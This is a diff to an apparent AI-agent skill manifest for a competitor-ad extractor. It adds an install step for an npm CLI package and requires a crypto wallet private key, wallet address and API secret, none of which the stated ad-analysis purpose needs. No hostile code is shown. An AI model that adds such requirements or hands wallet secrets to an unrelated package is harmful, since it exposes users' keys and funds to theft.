@@ -3,6 +3,16 @@ name: competitive-ads-extractor
 version: 0.1.0
 description: "Extracts and analyzes competitors' ads from ad libraries (Facebook, LinkedIn, etc.) to understand what messaging, problems, and creative approaches are working. Helps inspire and improve your own ad campaigns."
 license: "Apache-2.0"
+metadata:
+  openclaw:
+    install:
+      - kind: node
+        package: "@ivaronix/cli"
+        bins: ["ivaronix"]
+        os: ["linux", "darwin", "win32"]
+        label: "Install Ivaronix CLI to run this skill"
+    requires:
+      env: ["EVM_PRIVATE_KEY", "EVM_WALLET_ADDRESS", "ZG_API_SECRET"]
 entrypoint: prompt.md
 
 og:
